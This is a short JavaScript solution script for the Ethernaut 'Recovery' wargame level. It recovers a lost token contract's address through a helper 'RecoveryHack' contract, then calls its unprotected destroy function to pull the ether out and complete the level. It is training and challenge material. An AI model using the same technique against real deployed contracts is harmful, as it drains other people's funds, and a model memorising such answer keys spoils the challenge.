module.exports = async function({ artifacts, web3, ethernaut }) {
  const SimpleToken = artifacts.require('SimpleToken');
  const RecoveryHack = artifacts.require('RecoveryHack');
  const instanceAddress = await ethernaut.createInstance(web3, 'Recovery', { value: web3.utils.toWei('0.001', 'ether') });

  const hackContract = await RecoveryHack.new();
  const simpleTokenAddress = await hackContract.recover(instanceAddress);
  const simpleTokenInstance = await SimpleToken.at(simpleTokenAddress);

  const sender = await ethernaut.getSenderAddress(web3);
  await simpleTokenInstance.destroy(sender);

  return ethernaut.submitInstance(web3, instanceAddress);
};